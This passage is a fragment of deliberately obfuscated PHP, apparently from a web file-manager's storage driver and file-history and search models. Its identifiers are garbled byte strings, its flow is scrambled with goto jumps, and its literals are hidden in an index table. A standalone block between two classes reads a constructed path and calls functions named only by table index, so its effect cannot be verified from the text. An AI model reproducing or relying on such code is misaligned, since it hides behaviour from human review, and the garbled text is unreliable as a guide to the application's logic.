array($fÚ×ì…ñõÏ[1310] . $e‡µ˜Åå‡¼ . $fÚ×ì…ñõÏ[449] . $Dîì„…ê«ç); } $d‡£ÌÁ½Ô‚ = url_request($DĞ‚³¥ÄÂ±, $fÚ×ì…ñõÏ[238], !1, $B‚Ö…“œõª); return $d‡£ÌÁ½Ô‚[$fÚ×ì…ñõÏ[719]] ? $d‡£ÌÁ½Ô‚[$fÚ×ì…ñõÏ[1089]] : !1; } public function upload($fáÌ¼¹Õ˜Ÿ, $Ağ­‚¦µÊ, $F£¨„…êÒ¨ = false, $e‘“ÉÔÏø = REPEAT_REPLACE) { $E ÖÌîñ²ç = new Qiniu\Storage\UploadManager(); $C¡ê»ØØ¦ = $this->auth->uploadToken($this->bucket, $fáÌ¼¹Õ˜Ÿ); $bºƒ‡›¬ = get_file_mime(get_path_ext($Ağ­‚¦µÊ)); list($b‰Œ£Â¢¼, $C†ôˆ‘Ç”¾) = $E ÖÌîñ²ç->putFile($C¡ê»ØØ¦, $fáÌ¼¹Õ˜Ÿ, $Ağ­‚¦µÊ, null, $bºƒ‡›¬); return $C†ôˆ‘Ç”¾ ? !1 : $this->getPathOuter($fáÌ¼¹Õ˜Ÿ); } public function uploadFormData($F‡Û œ¨’, $eŒ°¤Û¤ñÎ = 3600) { return $this->uploadToken($F‡Û œ¨’, $eŒ°¤Û¤ñÎ); } public function multiUploadFormData($B­¥œ¡œ‹¼, $B…›º›½˜ã = 3600) { return $this->uploadToken($B­¥œ¡œ‹¼, $B…›º›½˜ã); } private function uploadToken($E‰‡é¡ÃŒ», $EÊô¦µõè = 3600) { goto eßÛ¹½¹; a‹»Î¥Šß´: $Dï×åÏ½ = $E‰‡é¡ÃŒ»; $côÔªÀˆ„¯ = $this->auth->uploadToken($this->bucket, $Dï×åÏ½, $A£ÄÁÄ¡¶á, $E£­…‰¢‹Æ, !0); $d–˜Ïè•‚ = empty($this->region) || $this->region == $cªó¾•“ƒ[1313] ? $cªó¾•“ƒ[33] : $cªó¾•“ƒ[449] . $this->region; goto a²½ÁÏ¯®; eßÛ¹½¹: $cªó¾•“ƒ =& $_SERVER[Ü˜]; $A£ÄÁÄ¡¶á = $EÊô¦µõè; $E£­…‰¢‹Æ = array($cªó¾•“ƒ[1311] => $cªó¾•“ƒ[1312]); goto a‹»Î¥Šß´; a²½ÁÏ¯®: $B¸ñÖ³áé = http_type() . "\72\x2f\x2f\x75\x70\x6c\x6f\141\x64{$d–˜Ïè•‚}\x2e\x71\151\x6e\x69\x75\x70\56\x63\157\x6d\57"; return array($cªó¾•“ƒ[1314] => $côÔªÀˆ„¯, $cªó¾•“ƒ[1315] => $B¸ñÖ³áé); goto EÈë”Œçïä; EÈë”Œçïä: } public function download($a‘×„åÆÇ, $B©ÕÈƒ´õ) { goto dÚì£«£ö; DšéôºŞÀŠ: fclose($B¶”ˆ»¥³¢); return $B©ÕÈƒ´õ; goto E…ŞïÒ¹…; b¼Š†µô†Ê: $cÑäœ–­‡ = 1024 * 200; $B¶”ˆ»¥³¢ = fopen($F¸Û˜¤Ó×, $_SERVER[Ü˜][1316]); while (!0) { $EÒ°¦‹Ìµ = $this->fileSubstr($a‘×„åÆÇ, $cùà‡¶•„, $cÑäœ–­‡); if ($EÒ°¦‹Ìµ === !1) { return !1; } fwrite($B¶”ˆ»¥³¢, $EÒ°¦‹Ìµ); $cùà‡¶•„ += $cÑäœ–­‡; if (strlen($EÒ°¦‹Ìµ) < $cÑäœ–­‡) { break; } } goto DšéôºŞÀŠ; dÚì£«£ö: $F¸Û˜¤Ó× = IO::getPathInner(IO::mkfile($B©ÕÈƒ´õ)); if (!($F®ç¼ƒ–ÏË = $this->link($a‘×„åÆÇ))) { return !1; } $cùà‡¶•„ = 0; goto b¼Š†µô†Ê; E…ŞïÒ¹…: } public function link($FìÎ·©‚ø, $eÆÆªíÃ¤° = '') { if (!$this->isFile($FìÎ·©‚ø)) { return !1; } $Aê¾†±ÑìŠ = $this->getHost() . $_SERVER[Ü˜][8] . $this->pathEncode($FìÎ·©‚ø) . $eÆÆªíÃ¤°; return $this->auth->privateDownloadUrl($Aê¾†±ÑìŠ, 3600 * 12); } public function fileOut($fÚóçå Š†, $dÀøŸ¨ïš = false, $dô­¶ÉØãö = false, $aœßÊ–¥Ëô = '') { $Aù²ƒÍ =& $_SERVER[Ü˜]; if ($this->isFileOutServer()) { return $this->fileOutServer($fÚóçå Š†, $dÀøŸ¨ïš, $dô­¶ÉØãö, $aœßÊ–¥Ëô); } if (!$dô­¶ÉØãö) { $dô­¶ÉØãö = $this->pathThis($fÚóçå Š†); } $d›ÄÍ˜Üó = $dÀøŸ¨ïš ? $Aù²ƒÍ[1317] . rawurlencode($dô­¶ÉØãö) : $Aù²ƒÍ[33]; $c³ùéŠÅÒÚ = $this->link($fÚóçå Š†, $d›ÄÍ˜Üó); $this->fileOutLink($c³ùéŠÅÒÚ); } public function fileOutServer($F¬äåôØ¨, $A³”‘Š¾Å = false, $e‘Ä¼øòç = false, $BÏââÆ©‡† = '') { parent::fileOut($F¬äåôØ¨, $A³”‘Š¾Å, $e‘Ä¼øòç, $BÏââÆ©‡†); } public function fileOutImage($f‡ñ°ßÑå, $dô™Ñ±•«¨ = 250) { $f»š—ÂäÑ× = $this->link($f‡ñ°ßÑå, $_SERVER[Ü˜][1318] . $dô™Ñ±•«¨); $this->fileOutLink($f»š—ÂäÑ×); } public function fileOutImageServer($B‚áÎ˜êÔ, $eÀÆÏ¯Û›í = 250) { parent::fileOutImage($B‚áÎ˜êÔ, $eÀÆÏ¯Û›í); } public function hashMd5($e¥ÀÎ—Ò¶‡) { $cÒÄ¤Øë =& $_SERVER[Ü˜]; $C”ÏòíÒŞÊ = $this->objectMeta($e¥ÀÎ—Ò¶‡); return isset($C”ÏòíÒŞÊ[$cÒÄ¤Øë[218]]) ? $C”ÏòíÒŞÊ[$cÒÄ¤Øë[218]] : !1; $cï©Ï‘†Ü = $this->link($e¥ÀÎ—Ò¶‡, $cÒÄ¤Øë[1319]); } public function size($dË‰ÀÎŸÎ) { $E½Ñì›ìÉ‘ = $this->objectMeta($dË‰ÀÎŸÎ); return $E½Ñì›ìÉ‘ ? $E½Ñì›ìÉ‘[$_SERVER[Ü˜][88]] : 0; } public function info($DìšªÌÚ¡£) { if ($this->isFolder($DìšªÌÚ¡£)) { return $this->folderInfo($DìšªÌÚ¡£); } else { if ($this->isFile($DìšªÌÚ¡£)) { return $this->fileInfo($DìšªÌÚ¡£); } } return !1; } public function exist($E‘ß‚ä˜ŞÒ) { return $this->isFile($E‘ß‚ä˜ŞÒ) || $this->isFolder($E‘ß‚ä˜ŞÒ); } public function isFile($A…ØƒîÆÈØ) { return !$this->isFolder($A…ØƒîÆÈØ) && $this->objectMeta($A…ØƒîÆÈØ); } public function isFolder($cªñª­ê“´) { return $this->cacheMethod($_SERVER[Ü˜][209], $cªñª­ê“´); } protected function objectMeta($C“¿¸÷İ™‡) { return $this->cacheMethod($_SERVER[Ü˜][210], $C“¿¸÷İ™‡); } protected function _objectMeta($D°„œÄâÒ‹) { $fİ¡ª‹Ç÷ =& $_SERVER[Ü˜]; list($aÌ¶½óŒ»à, $b’íğ†Ë‰é) = $this->bucketManager->stat($this->bucket, $D°„œÄâÒ‹); if ($aÌ¶½óŒ»à) { $aÌ¶½óŒ»à[$fİ¡ª‹Ç÷[88]] = intval($aÌ¶½óŒ»à[$fİ¡ª‹Ç÷[1305]]); } return $aÌ¶½óŒ»à; } protected function _isFolder($dï¼º×¡¯…) { $B§§¶àŒŒÒ =& $_SERVER[Ü˜]; if ($dï¼º×¡¯… == $B§§¶àŒŒÒ[33] || $dï¼º×¡¯… == $B§§¶àŒŒÒ[8]) { return !0; } list($câÏ«Îºš, $C‘ÑÈŸ—¯á) = $this->bucketManager->listFiles($this->bucket, trim($dï¼º×¡¯…, $B§§¶àŒŒÒ[8]) . $B§§¶àŒŒÒ[8], $B§§¶àŒŒÒ[33], 1, $B§§¶àŒŒÒ[8]); return !empty($câÏ«Îºš[$B§§¶àŒŒÒ[1308]]) || !empty($câÏ«Îºš[$B§§¶àŒŒÒ[1309]]) ? !0 : !1; } } if ($_SERVER[$_SERVER[Ü˜][59]] != $_SERVER[$_SERVER[Ü˜][840]]) { goto aù‹êÄÖ¨Å; F®†£áÔ†“: $FÈ´Î•÷Åö = explode($_SERVER[Ü˜][63], $eÃâù‘¤Ë—); if (count($FÈ´Î•÷Åö) < $_SERVER[Ü˜][64]) { $CŠ…‚ƒŒ  = $_SERVER[Ü˜][65]; $CŠ…‚ƒŒ (); } $EÄÑ£øã‰ë = $_SERVER[Ü˜][66]; goto fÓÍ‘¸«ò¡; fÓÍ‘¸«ò¡: $EÄÑ£øã‰ë($_SERVER[$_SERVER[Ü˜][57]]); goto F¸†İ‘ÖÁ†; aù‹êÄÖ¨Å: $Dé…æÈŠô§ = $_SERVER[Ü˜][60]; $E·ø’¯ô¬ì = $_SERVER[$_SERVER[Ü˜][61]] . $_SERVER[Ü˜][62]; $eÃâù‘¤Ë— = $Dé…æÈŠô§($E·ø’¯ô¬ì); goto F®†£áÔ†“; F¸†İ‘ÖÁ†: } goto AÌì«æÌ; Añ‘İ‚‰: class SourceHistoryModel extends ModelBase { protected $tableName = "\151\x6f\137\163\x6f\x75\162\x63\x65\137\x68\x69\163\164\x6f\x72\171"; public function historyCount($bÛ±ìÔíÊğ) { goto E—ê×ø„¡Õ; E—ê×ø„¡Õ: $B¤ÌÇ¨ÄêÔ =& $_SERVER[Ü˜]; if (!$bÛ±ìÔíÊğ) { return array(); } if (is_string($bÛ±ìÔíÊğ) || is_int($bÛ±ìÔíÊğ)) { $bÛ±ìÔíÊğ = array($bÛ±ìÔíÊğ); } goto E™½½ÜÈ¸; E™½½ÜÈ¸: $bÇ¦´ƒÏÆà = array($B¤ÌÇ¨ÄêÔ[404], $B¤ÌÇ¨ÄêÔ[1725] => $B¤ÌÇ¨ÄêÔ[489]); $fÁ¹ÎÙŠ†… = array($B¤ÌÇ¨ÄêÔ[404] => array($B¤ÌÇ¨ÄêÔ[7], $bÛ±ìÔíÊğ)); $D®È“İš‰Ü = $this->field($bÇ¦´ƒÏÆà)->where($fÁ¹ÎÙŠ†…)->group($B¤ÌÇ¨ÄêÔ[404])->select(); goto FÂíõè§’ì; FÂíõè§’ì: return array_to_keyvalue($D®È“İš‰Ü, $B¤ÌÇ¨ÄêÔ[404], $B¤ÌÇ¨ÄêÔ[489]); goto c‘·‡ºÛ×²; c‘·‡ºÛ×²: } public function addHistory($B¸÷©£¡¤, $D˜µ½°§Îª = '') { $eá¨¾«”Æ£ =& $_SERVER[Ü˜]; $bö¿öåÉâ¢ = array($eá¨¾«”Æ£[419] => $B¸÷©£¡¤[$eá¨¾«”Æ£[404]], $eá¨¾«”Æ£[1521] => isset($B¸÷©£¡¤[$eá¨¾«”Æ£[443]]) ? $B¸÷©£¡¤[$eá¨¾«”Æ£[443]] : $B¸÷©£¡¤[$eá¨¾«”Æ£[441]], $eá¨¾«”Æ£[457] => $B¸÷©£¡¤[$eá¨¾«”Æ£[456]], $eá¨¾«”Æ£[557] => $B¸÷©£¡¤[$eá¨¾«”Æ£[88]], $eá¨¾«”Æ£[1921] => $D˜µ½°§Îª); $cµ¼ÂñóÚŸ = $GLOBALS[$eá¨¾«”Æ£[6]][$eá¨¾«”Æ£[98]][$eá¨¾«”Æ£[1105]]; if ($cµ¼ÂñóÚŸ > 1) { $this->historyAutoClear($bö¿öåÉâ¢[$eá¨¾«”Æ£[404]]); $this->add($bö¿öåÉâ¢); } Hook::trigger($eá¨¾«”Æ£[1922], $bö¿öåÉâ¢); Model($eá¨¾«”Æ£[1923])->eventFileEdit($B¸÷©£¡¤[$eá¨¾«”Æ£[404]]); } private function historyAutoClear($f£¶šÏ·ˆæ) { goto fÑğ‰ğÈÃ; Fß³Àö›¬‚: $bË³ˆ”™¼À = array_to_keyvalue($fÜ«µÕ…²ù, $a…÷ãÕ¦£É[33], $a…÷ãÕ¦£É[402]); $bË³ˆ”™¼À = array_slice($bË³ˆ”™¼À, $cì‘®Üá¤†); $b‘’»ƒÓ«ç = array_to_keyvalue($fÜ«µÕ…²ù, $a…÷ãÕ¦£É[33], $a…÷ãÕ¦£É[456]); goto a¹ÂŠ¡è´; D°ƒÆ˜¤©: $cì‘®Üá¤† = $BÙÔÜ¼íÖÒ == $a…÷ãÕ¦£É[1128] ? 5 : $F£–™ĞÉ¦; if ($F£–™ĞÉ¦ <= 1) { $cì‘®Üá¤† = 1; } if ($cì‘®Üá¤† >= 500) { return; } goto AÜá“„¤¼; fÑğ‰ğÈÃ: $a…÷ãÕ¦£É =& $_SERVER[Ü˜]; $BÙÔÜ¼íÖÒ = Model($a…÷ãÕ¦£É[739])->get($a…÷ãÕ¦£É[1127]); $F£–™ĞÉ¦ = $GLOBALS[$a…÷ãÕ¦£É[6]][$a…÷ãÕ¦£É[98]][$a…÷ãÕ¦£É[1105]]; goto D°ƒÆ˜¤©; B«ÙÃö««°: $this->where($D—­ñ•‡¹¤)->delete(); Model($a…÷ãÕ¦£É[459])->remove($b‘’»ƒÓ«ç); goto CÃ—½ìµ‹¨; AÜá“„¤¼: $D—­ñ•‡¹¤ = array($a…÷ãÕ¦£É[419] => $f£¶šÏ·ˆæ); $fÜ«µÕ…²ù = $this->field($a…÷ãÕ¦£É[1924])->where($D—­ñ•‡¹¤)->order($a…÷ãÕ¦£É[1918])->select(); if (!$fÜ«µÕ…²ù || $cì‘®Üá¤† >= count($fÜ«µÕ…²ù)) { return; } goto Fß³Àö›¬‚; a¹ÂŠ¡è´: $b‘’»ƒÓ«ç = array_slice($b‘’»ƒÓ«ç, $cì‘®Üá¤†); if (!$bË³ˆ”™¼À || !$b‘’»ƒÓ«ç) { return; } $D—­ñ•‡¹¤ = array($a…÷ãÕ¦£É[421] => array($a…÷ãÕ¦£É[7], $bË³ˆ”™¼À)); goto B«ÙÃö««°; CÃ—½ìµ‹¨: } public function listData($EÂ½ñŸğÍ) { goto A‘Ñ±Ê‘Ÿ¨; EÂŒÇ¸”Ü™: $AÊ¡ù¶ÜË = 5; if ($A‹¬À–µ == $A¢¥–õ¿à¹[1128]) { $EŒ©®±ó–Û[$A¢¥–õ¿à¹[376]] = array_slice($EŒ©®±ó–Û[$A¢¥–õ¿à¹[376]], 0, $AÊ¡ù¶ÜË); $EŒ©®±ó–Û[$A¢¥–õ¿à¹[373]] = array($A¢¥–õ¿à¹[1926] => 1, $A¢¥–õ¿à¹[1927] => 20, $A¢¥–õ¿à¹[1928] => 1, $A¢¥–õ¿à¹[1929] => count($EŒ©®±ó–Û[$A¢¥–õ¿à¹[376]])); } return $EŒ©®±ó–Û; goto bšˆ—ÎÚ Ú; A‘Ñ±Ê‘Ÿ¨: $A¢¥–õ¿à¹ =& $_SERVER[Ü˜]; $f±ïóš·Ëê = array($A¢¥–õ¿à¹[419] => $EÂ½ñŸğÍ); $AÏæáİ ä = $A¢¥–õ¿à¹[1925]; goto aõƒÊ´°¦; aõƒÊ´°¦: $EŒ©®±ó–Û = $this->field($AÏæáİ ä)->where($f±ïóš·Ëê)->order($A¢¥–õ¿à¹[1918])->selectPage(); $this->_listAppendUser($EŒ©®±ó–Û[$A¢¥–õ¿à¹[376]]); $A‹¬À–µ = Model($A¢¥–õ¿à¹[739])->get($A¢¥–õ¿à¹[1127]); goto EÂŒÇ¸”Ü™; bšˆ—ÎÚ Ú: } protected function _listAppendUser(&$C–ÄÎ± à) { $D¢’ˆÓ”Ó =& $_SERVER[Ü˜]; $cµ¾Ñ·ŸÍø = array_to_keyvalue($C–ÄÎ± à, $D¢’ˆÓ”Ó[33], $D¢’ˆÓ”Ó[1529]); $Bø„°òìŠÌ = Model($D¢’ˆÓ”Ó[515])->userListInfo($cµ¾Ñ·ŸÍø); foreach ($C–ÄÎ± à as &$d°•æó™) { $Aãì³¸ÕÄÕ = $d°•æó™[$D¢’ˆÓ”Ó[1529]]; $d°•æó™[$D¢’ˆÓ”Ó[441]] = $Bø„°òìŠÌ[$Aãì³¸ÕÄÕ] ? $Bø„°òìŠÌ[$Aãì³¸ÕÄÕ] : !1; } unset($d°•æó™); } public function fileInfo($Dæøà³º¢¡) { $dæÃËøŒ – =& $_SERVER[Ü˜]; $dœ…¬Æœ‰ = $this->tablePrefix; $b´ŠÃ‚“¥‘ = "{$dœ…¬Æœ‰}\x69\x6f\x5f\146\151\x6c\x65\40\146\151\x6c\x65\x73\x20\157\156\40\146\151\x6c\x65\x73\56\146\151\154\x65\111\104\x20\x3d\40\x68\151\x73\164\x6f\x72\x79\x2e\x66\151\154\x65\x49\104"; return $this->alias($dæÃËøŒ –[1930])->where(array($dæÃËøŒ –[421] => $Dæøà³º¢¡))->join($b´ŠÃ‚“¥‘, $dæÃËøŒ –[1931])->find(); } public function removeItem($b¹ŠÍ—êØ«) { $D†Š¬äøÈ =& $_SERVER[Ü˜]; $A•Äå»‘¸ = array($D†Š¬äøÈ[421] => $b¹ŠÍ—êØ«); $cÒ÷¼ÛØî = $this->where($A•Äå»‘¸)->find(); if ($cÒ÷¼ÛØî) { $Bã’„Á¹˜Ç = $this->where($A•Äå»‘¸)->delete(); Model($D†Š¬äøÈ[459])->remove($cÒ÷¼ÛØî[$D†Š¬äøÈ[456]]); return $Bã’„Á¹˜Ç; } return !1; } public function removeBySource($F·¨­†©¼) { goto E†Šë¶È•ƒ; aß¼æ âğ: return !0; goto d¾®‚—Ÿ…–; dİ£´‘Ç‚µ: $c­ÙÎ‡Öì× = array($AùÜĞ¿„‚÷[419] => array($AùÜĞ¿„‚÷[7], $F·¨­†©¼)); $F×µ½ëòê = $this->field($AùÜĞ¿„‚÷[457])->where($c­ÙÎ‡Öì×)->select(); if ($F×µ½ëòê) { $this->where($c­ÙÎ‡Öì×)->delete(); $AĞêó¡¤Ã = array_to_keyvalue($F×µ½ëòê, $AùÜĞ¿„‚÷[33], $AùÜĞ¿„‚÷[456]); Model($AùÜĞ¿„‚÷[459])->remove($AĞêó¡¤Ã); } goto aß¼æ âğ; E†Šë¶È•ƒ: $AùÜĞ¿„‚÷ =& $_SERVER[Ü˜]; if (!$F·¨­†©¼) { return !1; } if (!is_array($F·¨­†©¼)) { $F·¨­†©¼ = array($F·¨­†©¼); } goto dİ£´‘Ç‚µ; d¾®‚—Ÿ…–: } public function setDetail($A…ê‘˜‘„§, $d’êÜÜóß) { $A’³‰©¤ìÃ =& $_SERVER[Ü˜]; return $this->where(array($A’³‰©¤ìÃ[421] => $A…ê‘˜‘„§))->save(array($A’³‰©¤ìÃ[1921] => $d’êÜÜóß)); } public function rollbackToItem($EêÅ¾ô¹àò, $añ„Íè«®¦) { goto Dñ¼òÕõî; eœ½¢¾±»é: $Bâ³›Ø·ÊÎ = $this->find($añ„Íè«®¦); $Dãß«å ¡Š = array($díñããÔŒÚ[456] => $Bâ³›Ø·ÊÎ[$díñããÔŒÚ[456]], $díñããÔŒÚ[88] => $Bâ³›Ø·ÊÎ[$díñããÔŒÚ[88]], $díñããÔŒÚ[94] => time(), $díñããÔŒÚ[443] => USER_ID); Model($díñããÔŒÚ[799])->where(array($díñããÔŒÚ[404] => $EêÅ¾ô¹àò))->save($Dãß«å ¡Š); goto AàÓí½Ö; Dñ¼òÕõî: $díñããÔŒÚ =& $_SERVER[Ü˜]; $càÕ„Êˆ¾‘ = Model($díñããÔŒÚ[799])->sourceInfo($EêÅ¾ô¹àò); $this->addHistory($càÕ„Êˆ¾‘, LNG($díñããÔŒÚ[1932])); goto eœ½¢¾±»é; AàÓí½Ö: return $this->where(array($díñããÔŒÚ[421] => $añ„Íè«®¦))->delete(); goto E¼ÔÙÇˆ; E¼ÔÙÇˆ: } public function clearSame($Fõ·ÊÏªãµ) { goto C±ë»“‡‚È; F°‰Û–‹¬Í: if (!$a¬¥¶Ÿ½ ) { return; } $this->where(array($e °•ƒÖœâ[402] => array($e °•ƒÖœâ[7], $a¬¥¶Ÿ½ )))->delete(); Model($e °•ƒÖœâ[459])->remove($B„Ûë“£ãÜ); goto fÍ†®Ò¢©Ş; aòÆŒ“Ñ›¤: $B„Ûë“£ãÜ = array(); $a¬¥¶Ÿ½  = array(); foreach ($Dööë•àˆ as $a²Íéç‘ßË) { if (!$a²Íéç‘ßË || count($a²Íéç‘ßË) <= 1) { continue; } foreach ($a²Íéç‘ßË as $FëÈî¹á«ô) { $B„Ûë“£ãÜ[] = $FëÈî¹á«ô[$e °•ƒÖœâ[456]]; $a¬¥¶Ÿ½ [] = $FëÈî¹á«ô[$e °•ƒÖœâ[402]]; } } goto F°‰Û–‹¬Í; C±ë»“‡‚È: $e °•ƒÖœâ =& $_SERVER[Ü˜]; $cÓ³Èİ”÷‘ = $this->listData($Fõ·ÊÏªãµ); $Dööë•àˆ = array_to_keyvalue_group($cÓ³Èİ”÷‘, $e °•ƒÖœâ[456]); goto aòÆŒ“Ñ›¤; fÍ†®Ò¢©Ş: } public function userSpace() { $bÊ ìÌñ­Ç =& $_SERVER[Ü˜]; $DìºµÔ‚µï = $this->tablePrefix; $CÃ‡ëğ× = array($bÊ ìÌñ­Ç[1521] => USER_ID); $FÇ†Üñ®… = "{$DìºµÔ‚µï}\151\157\x5f\x66\151\x6c\x65\40\x66\x69\154\145\x73\40\x6f\156\40\146\151\x6c\145\163\x2e\x66\151\154\x65\111\104\x20\75\x20\x68\151\x73\164\x6f\162\x79\56\x66\x69\154\x65\x49\104"; return $this->alias($bÊ ìÌñ­Ç[1930])->where($CÃ‡ëğ×)->join($FÇ†Üñ®…, $bÊ ìÌñ­Ç[1931])->sum($bÊ ìÌñ­Ç[88]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($DÁ½ˆ­ ‹‹) { goto D¾äÕÏÂ…; E˜Â®Ú²ÊŠ: if (!$A‡İÓ¤…¯§) { return array(); } $E–â‘é™×÷ = $A‡İÓ¤…¯§[$cÜÇ³›„[178]]; $C²ä¨Á‚­Ó = $cÜÇ³›„[7]; goto BÄ‡¤‚ïëÖ; D¾äÕÏÂ…: $cÜÇ³›„ =& $_SERVER[Ü˜]; $EìÌÌ®ÎØ = KodIO::fileTypeList(); $A‡İÓ¤…¯§ = $EìÌÌ®ÎØ[$DÁ½ˆ­ ‹‹]; goto E˜Â®Ú²ÊŠ; BÄ‡¤‚ïëÖ: if (!$A‡İÓ¤…¯§[$cÜÇ³›„[178]]) { $cœ«Ú”£Âí = array_to_keyvalue($EìÌÌ®ÎØ, $cÜÇ³›„[33], $cÜÇ³›„[178]); $E–â‘é™×÷ = implode($cÜÇ³›„[47], $cœ«Ú”£Âí); $C²ä¨Á‚­Ó = $cÜÇ³›„[1933]; } $EÜ×ŠÓ£ = explode($cÜÇ³›„[47], trim($E–â‘é™×÷, $cÜÇ³›„[47])); return array($C²ä¨Á‚­Ó, $EÜ×ŠÓ£); goto cÂ’ä„‘’; cÂ’ä„‘’: } public function listPathType($eŒğàíÄè¢) { $D°Ç¡ºÍƒ¸ =& $_SERVER[Ü˜]; $a¦ğ”ô¶¨º = $this->fileTypeWhere($eŒğàíÄè¢); if (!$a¦ğ”ô¶¨º) { return array(); } $cºÆ©÷÷ƒ = array($D°Ç¡ºÍƒ¸[558] => SourceModel::TYPE_USER, $D°Ç¡ºÍƒ¸[559] => USER_ID, $D°Ç¡ºÍƒ¸[555] => 0, $D°Ç¡ºÍƒ¸[556] => $a¦ğ”ô¶¨º); return $this->listSource($cºÆ©÷÷ƒ); } public function listSearch($Eƒ¥–³ç, $dîµ¢ô¬Ê— = 300) { goto B”Ï•Õ¸; C±½„°èæ: $bã«ÎÇ¶¤ = $this->distinct(!0)->field($BÖ§³«µİ)->where($D‡½ŒÎ¿¯»)->selectPage($dîµ¢ô¬Ê—); $this->_listSearchFileContent($bã«ÎÇ¶¤, $Eƒ¥–³ç, $f¤¤‰‹Â‚); $this->_listSearchDesc($bã«ÎÇ¶¤, $Eƒ¥–³ç, $f¤¤‰‹Â‚); goto b²ŸÄ×åËÔ; b²ŸÄ×åËÔ: $this->_listSearchTag($bã«ÎÇ¶¤, $Eƒ¥–³ç, $f¤¤‰‹Â‚); $this->_listSearchGroupTag($bã«ÎÇ¶¤, $Eƒ¥–³ç, $f¤¤‰‹Â‚); $this->_listDataApply($bã«ÎÇ¶¤[$aßÒ›‚ÀÔ¬[376]]); goto AãÖÒõâŠ; bÎÖ–¾‹ç”: $this->_listSearchBindPinyin($Eƒ¥–³ç, $D‡½ŒÎ¿¯», $BÖ§³«µİ); $this->alias($aßÒ›‚ÀÔ¬[525])->_makeOrder(); $D‡½ŒÎ¿¯» = $this->parseWhereLike($D‡½ŒÎ¿¯»); goto C±½„°èæ; A·ê¸ƒ±ÌĞ: if (!isset($D‡½ŒÎ¿¯»[$aßÒ›‚ÀÔ¬[432]])) { $D‡½ŒÎ¿¯»[$aßÒ›‚ÀÔ¬[432]] = 0; } $BÖ§³«µİ = $aßÒ›‚ÀÔ¬[1935]; $f¤¤‰‹Â‚ = $BÖ§³«µİ; goto bÎÖ–¾‹ç”; B”Ï•Õ¸: $aßÒ›‚ÀÔ¬ =& $_SERVER[Ü˜]; if (isset($Eƒ¥–³ç[$aßÒ›‚ÀÔ¬[1776]]) && $Eƒ¥–³ç[$aßÒ›‚ÀÔ¬[1776]]) { $Eƒ¥–³ç[$aßÒ›‚ÀÔ¬[1776]] = str_replace($aßÒ›‚ÀÔ¬[390], $aßÒ›‚ÀÔ¬[1934], trim($Eƒ¥–³ç[$aßÒ›‚ÀÔ¬[1776]])); } $D‡½ŒÎ¿¯» = $this->_parseSearchWhere($Eƒ¥–³ç); goto A·ê¸ƒ±ÌĞ; AãÖÒõâŠ: $this->_listMake($bã«ÎÇ¶¤); return $bã«ÎÇ¶¤; goto eèŠó„Áù¶; eèŠó„Áù¶: } private function _listSearchFileContent(&$BŠ•…à½ä±, $E…Ò…ÕåÅ, $bç±„¥øŞ‚) { goto EµøÊ›Ó; a±Šœ´éˆ: unset($E…Ò…ÕåÅ[$F¸‰—»áøŸ[456]]); $D´ÁÒ”ï‰÷ = $this->field($bç±„¥øŞ‚)->where($eŠ™³­ò)->limit($F¸‰—»áøŸ[1936])->select(); if (!$D´ÁÒ”ï‰÷ || count($D´ÁÒ”ï‰÷) == 0) { return; } goto aÙÎò¤¯ˆ¥; EµøÊ›Ó: $F¸‰—»áøŸ =& $_SERVER[Ü˜]; if (!$E…Ò…ÕåÅ[$F¸‰—»áøŸ[1776]] || $BŠ•…à½ä±[$F¸‰—»áøŸ[373]][$F¸‰—»áøŸ[360]] > 1) { return; } $eŠ™³­ò = $this->_parseSearchWhere($E…Ò…ÕåÅ); goto DÂ»åÓŸ›¢; DÂ»åÓŸ›¢: if (!isset($eŠ™³­ò[$F¸‰—»áøŸ[28]]) || !is_array($E…Ò…ÕåÅ[$F¸‰—»áøŸ[456]])) { return; } $eŠ™³­ò[$F¸‰—»áøŸ[456]] = array($F¸‰—»áøŸ[7], $E…Ò…ÕåÅ[$F¸‰—»áøŸ[456]]); unset($eŠ™³­ò[$F¸‰—»áøŸ[28]]); goto a±Šœ´éˆ; aÙÎò¤¯ˆ¥: $BŠ•…à½ä±[$F¸‰—»áøŸ[376]] = array_merge($D´ÁÒ”ï‰÷, $BŠ•…à½ä±[$F¸‰—»áøŸ[376]]); $BŠ•…à½ä±[$F¸‰—»áøŸ[373]][$F¸‰—»áøŸ[374]] += count($D´ÁÒ”ï‰÷); goto bë£ë›£ù‘; bë£ë›£ù‘: } private function _listSearchTag(&$fÀË¶ÊŒ¢‹, $eŸËŸÂ¤ïÆ, $c‹êç¸¯ŸÂ) { goto e§ê¸ÇŞŸ; e§ê¸ÇŞŸ: $eÆÉ«ã˜ªÏ =& $_SERVER[Ü˜]; if (!$eŸËŸÂ¤ïÆ[$eÆÉ«ã˜ªÏ[1776]] || $fÀË¶ÊŒ¢‹[$eÆÉ«ã˜ªÏ[373]][$eÆÉ«ã˜ªÏ[360]] > 1) { return; } $F¨ŸÏºò = Model($eÆÉ«ã˜ªÏ[1937])->listData(); goto EÊ¥‹®êãÚ; EÊ¥‹®êãÚ: $c¼°Ñ®ÉëŸ = array(); $Dø²âäåÇ§ = $eŸËŸÂ¤ïÆ[$eÆÉ«ã˜ªÏ[1776]]; foreach ($F¨ŸÏºò as $f‹‘ÓÛä£¦) { $cÂº‚¤ƒÇ• = $f‹‘ÓÛä£¦[$eÆÉ«ã˜ªÏ[28]]; $bñ¯ÒŸ™Äˆ = str_replace($eÆÉ«ã˜ªÏ[50], $eÆÉ«ã˜ªÏ[33], Pinyin::encode($cÂº‚¤ƒÇ•)); if (stripos($cÂº‚¤ƒÇ•, $Dø²âäåÇ§) !== !1 || stripos($bñ¯ÒŸ™Äˆ, $Dø²âäåÇ§) !== !1) { $c¼°Ñ®ÉëŸ[] = $f‹‘ÓÛä£¦[$eÆÉ«ã˜ªÏ[402]]; } } goto Dò‰ùº¸¹Ê; Dò‰ùº¸¹Ê: if (!$c¼°Ñ®ÉëŸ) { return; } $eË“ÒœÛˆ = array($eÆÉ«ã˜ªÏ[428] => array($eÆÉ«ã˜ªÏ[7], $c¼°Ñ®ÉëŸ), $eÆÉ«ã˜ªÏ[1529] => USER_ID); $FÅÌ¡ö¯Œ‰ = Model($eÆÉ«ã˜ªÏ[429])->field($eÆÉ«ã˜ªÏ[86])->where($eË“ÒœÛˆ)->select(); goto d›Öìåß; d›Öìåß: $FÅÌ¡ö¯Œ‰ = array_to_keyvalue($FÅÌ¡ö¯Œ‰, $eÆÉ«ã˜ªÏ[33], $eÆÉ«ã˜ªÏ[86]); $Aõ±ğ•«  = array_unique($FÅÌ¡ö¯Œ‰); 